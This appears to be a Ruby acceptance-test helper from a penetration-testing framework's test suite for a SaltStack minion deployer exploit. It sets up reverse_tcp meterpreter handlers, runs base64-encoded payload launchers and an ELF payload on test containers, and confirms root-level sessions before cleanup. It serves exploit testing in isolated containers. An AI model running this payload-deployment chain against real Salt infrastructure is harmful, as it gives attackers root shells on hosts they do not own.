# frozen_string_literal: true

require 'base64'
require 'digest'
require 'securerandom'
require_relative '../saltstack_rce/acceptance'

module Acceptance
  # Authenticate setup independently, then invoke the unmodified local owner.
  module SaltstackDeployer
    include SaltstackRce

    DEPLOY_OWNER = 'exploit/linux/local/saltstack_salt_minion_deployer'
    INITIAL_PORT = 4473
    OWNER_PORT = 4474
    NATIVE_PORT = 4475

    def dx_native(phase)
      output = +''
      argv = ['python3', 'test/module_targets/saltstack_deployer/native_probe.py', ENV.fetch('MODULE_TARGET_RUNTIME'), phase]
      expect(ModuleTargetTests.new.send(:command, argv, path: File.join(target_runtime.fetch('artifacts'), "native-#{phase}.log"), timeout: 480, capture: output, quiet: true)).to be(true), output
      data = JSON.parse(File.read(File.join(target_runtime.fetch('artifacts'), "native-#{phase}.json")))
      expect(data.fetch('status')).to eq('native_passed')
      data
    end

    def dx_handler(payload, port)
      before = sx_json('framework.jobs.keys')
      console_command('back')
      console_command('use exploit/multi/handler')
      { 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => port, 'ExitOnSession' => false }.each do |name, value|
        console_command("set #{name} #{value}")
      end
      console_command('run -j -z')
      jobs = sx_json('framework.jobs.keys') - before
      expect(jobs.length).to eq(1)
      jobs.fetch(0)
    end

    def dx_ready(owner, count, excluding: [])
      identifiers = nil
      sx_poll(60) do
        rows = sx_json("framework.sessions.values.select { |session| session.via_exploit == #{owner.inspect} }.map { |session| {id: session.sid, db_id: session.db_record&.id} }")
        identifiers = rows.map { |row| row.fetch('id') } - excluding
        events = File.readlines(File.join(target_runtime.fetch('artifacts'), 'ready-sessions.jsonl')).map { |line| JSON.parse(line).fetch('id') }
        expect(identifiers.length).to eq(count)
        expect(identifiers - events).to eq([])
        expect(rows.reject { |row| excluding.include?(row.fetch('id')) }.map { |row| row.fetch('db_id') }).to all(be_a(Integer))
      end
      identifiers
    end

    def dx_proof(identifier, role, owner:)
      path = "/tmp/module-target-salt-proof-#{SecureRandom.hex(6)}"
      value = "salt-deployment-#{SecureRandom.hex(12)}"
      service = @native.fetch('addresses').fetch(role).fetch('service')
      begin
        proof = sx_json("SaltDeploymentSessionControl.proof(framework,#{identifier},#{path.inspect},#{value.inspect})")
        expect(proof.fetch('container_role')).to eq(@native.fetch('identities').fetch(role).fetch('state'))
        expect(proof.fetch('via_exploit')).to eq(owner)
        expect(proof.fetch('peer').split(':').first).to eq(@native.fetch('addresses').fetch(role).fetch('address'))
        expect(target_exec(service, 'cat', path)).to eq(value)
        expect(target_exec(service, 'stat', '-c', '%u', path).strip).to eq('0')
        @native.fetch('addresses').each do |other_role, entry|
          next if other_role == role

          target_exec(entry.fetch('service'), 'test', '!', '-e', path)
        end
        pids = proof.fetch('type') == 'meterpreter' ? [proof.fetch('pid')] : [Integer(proof.fetch('command_pid'))]
        pids.each { |pid| expect(target_exec(service, 'cat', "/proc/#{pid}/status")).to match(/^Uid:\s+0\s+0\s+0\s+0$/) }
        proof['target_pids'] = pids
        proof['service'] = service
        @deployment_proofs[identifier] = proof
        expect(sx_sessions_sql.map { |row| row.fetch('id') }).to include(proof.fetch('db_id'))
        sx_record('deployment-session-proofs.jsonl', workspace: @workspace, proof: proof, proof_sha256: Digest::SHA256.hexdigest(value))
        proof
      ensure
        target_exec(service, 'rm', '-f', path)
      end
    end

    def dx_master(payload)
      job = dx_handler(payload, INITIAL_PORT)
      generated = sx_json("RocketmqSessionControl.command(framework.jobs.fetch(#{job.inspect}),#{payload.inspect})")
      output = target_exec('master', 'python', '-c', File.read('test/module_targets/saltstack_gather/sdk_launch.py'), generated.fetch('command_base64'), payload.start_with?('python/') ? 'python' : 'command')
      launch = sx_document(output, 'SALT_GATHER_SDK=')
      expect(launch.fetch('payload_sha256')).to eq(generated.fetch('sha256'))
      sx_record('native-master-dispatches.jsonl', workspace: @workspace, launch: launch, generated: generated)
      identifier = dx_ready('exploit/multi/handler', 1).fetch(0)
      dx_proof(identifier, 'master', owner: 'exploit/multi/handler')
      identifier
    end

    def dx_native_elf(architecture)
      payload = "linux/#{architecture}/meterpreter/reverse_tcp"
      job = dx_handler(payload, NATIVE_PORT)
      generated = sx_json("SaltDeploymentSessionControl.executable(framework.jobs.fetch(#{job.inspect}),#{payload.inspect},framework)")
      identifier = SecureRandom.hex(8)
      paths = { 'source' => "/tmp/module-target-native-elf-source-#{identifier}", 'destination' => "/tmp/module-target-native-elf-#{identifier}" }
      configuration = generated.merge(paths).merge('selector' => 'module-target-minion-a')
      code = "import base64,subprocess;script=base64.b64decode(#{Base64.strict_encode64(File.read('test/module_targets/saltstack_deployer/native_elf.py')).inspect});result=subprocess.run(['python','-c',script.decode()],input=base64.b64decode(#{Base64.strict_encode64(JSON.generate(configuration)).inspect}));raise SystemExit(result.returncode)"
      output = target_exec('master', 'python', '-c', code)
      launch = sx_document(output, 'SALT_DEPLOY_ELF=')
      sx_record('native-elf-dispatches.jsonl', workspace: @workspace, generated: generated.except('executable_base64', 'command_base64'), launch: launch, paths: paths)
      expect(launch.fetch('status')).to eq('native_elf_dispatched')
      session = dx_ready('exploit/multi/handler', 1).fetch(0)
      dx_proof(session, 'minion-a', owner: 'exploit/multi/handler')
    ensure
      if paths
        target_exec('master', 'rm', '-f', paths.fetch('source'))
        %w[minion_a minion_b].each { |service| target_exec(service, 'rm', '-f', paths.fetch('destination'), paths.fetch('destination') + '.b64') }
      end
    end

    def dx_owner(initial)
      @deployment_directory = "/tmp/module-target-owner-deployer-#{SecureRandom.hex(8)}"
      %w[master minion_a minion_b].each { |service| target_exec(service, 'mkdir', '-m', '700', @deployment_directory) }
      output = run_target_module(DEPLOY_OWNER, 'master', {
        'SESSION' => initial, 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',
        'LHOST' => listener_host, 'LPORT' => OWNER_PORT, 'ListenerTimeout' => 5,
        'WritableDir' => @deployment_directory, 'TargetWritableDir' => @deployment_directory
      }, action: 'run -j -z', allow_errors: true, endpoint_options: {}, command_timeout: 60)
      sx_record('owning-calls.jsonl', workspace: @workspace, owner: DEPLOY_OWNER, initial_session: initial, output: output, directory: @deployment_directory)
      sx_poll(60) do
        expect(sx_json("framework.jobs.values.select { |job| job.ctx.first.respond_to?(:fullname) && job.ctx.first.fullname == #{DEPLOY_OWNER.inspect} }.map(&:jid)")).to eq([])
      end
      full = console_command('sessions -l') + console.all_data
      sx_record('owning-completion.jsonl', workspace: @workspace, output: full.dup.force_encoding(Encoding::UTF_8))
      expect(full).not_to match(/undefined local variable|undefined method|Exception in on_new_session|Exploit failed|Msf::OptionValidateError/)
      identifiers = dx_ready(DEPLOY_OWNER, 2)
      identifiers.each do |identifier|
        row = sx_json("SaltDeploymentSessionControl.role(framework,#{identifier})")
        dx_proof(identifier, row.fetch('role'), owner: DEPLOY_OWNER)
      end
      expect(identifiers.map { |identifier| @deployment_proofs.fetch(identifier).fetch('container_role').fetch('role') }.sort).to eq(%w[minion-a minion-b])
    end

    def dx_cleanup
      errors = []
      begin
        console_command('jobs -K')
        console_command('sessions -K')
        sx_poll(30) { expect(sx_json('framework.sessions.keys')).to eq([]) }
        sx_poll(30) { expect(sx_json('framework.jobs.keys')).to eq([]) }
        @deployment_proofs&.each_value do |proof|
          sx_poll(30) do
            code = 'import json,pathlib,sys;print(json.dumps([pid for pid in sys.argv[1:] if pathlib.Path("/proc",pid).exists()]))'
            expect(JSON.parse(target_exec(proof.fetch('service'), 'python', '-c', code, *proof.fetch('target_pids').map(&:to_s)))).to eq([])
          end
        end
        sx_poll(30) do
          rows = sx_sessions_sql
          expect(rows.map { |row| row.fetch('closed_at') }).not_to include(nil)
        end
        code = 'require "json";ports=ARGV.map(&:to_i);puts JSON.generate(%w[/proc/net/tcp /proc/net/tcp6].flat_map{|path|File.readlines(path).drop(1).map(&:split)}.select{|row|row[3]=="0A"&&ports.include?(row[1].split(":").last.to_i(16))})'
        sx_poll(30) do
          expect(JSON.parse(target_exec('framework', 'ruby', '-e', code, INITIAL_PORT.to_s, OWNER_PORT.to_s, NATIVE_PORT.to_s))).to eq([])
        end
      rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
        errors << e
      end
      if @deployment_directory
        %w[master minion_a minion_b].each do |service|
          code = 'import hashlib,json,pathlib,sys;root=pathlib.Path(sys.argv[1]);print(json.dumps([{ "name":p.name,"bytes":p.stat().st_size,"sha256":hashlib.sha256(p.read_bytes()).hexdigest()} for p in root.iterdir()]))'
          files = JSON.parse(target_exec(service, 'python', '-c', code, @deployment_directory))
          sx_record('owning-artifacts.jsonl', workspace: @workspace, service: service, directory: @deployment_directory, files: files)
          # Capture every host before the harness fallback removes task files.
          expect(files).to eq([])
        rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
          errors << e
        ensure
          begin
            cleanup = 'from pathlib import Path;import sys;root=Path(sys.argv[1]);[p.unlink() for p in root.iterdir()];root.rmdir()'
            target_exec(service, 'python', '-c', cleanup, @deployment_directory)
          rescue StandardError => e
            errors << e
          end
        end
      end
      errors.each { |error| sx_record('cleanup-proof-errors.jsonl', workspace: @workspace, error: error.class.name, message: error.message) }
      raise errors.first unless errors.empty?
    end
  end
end
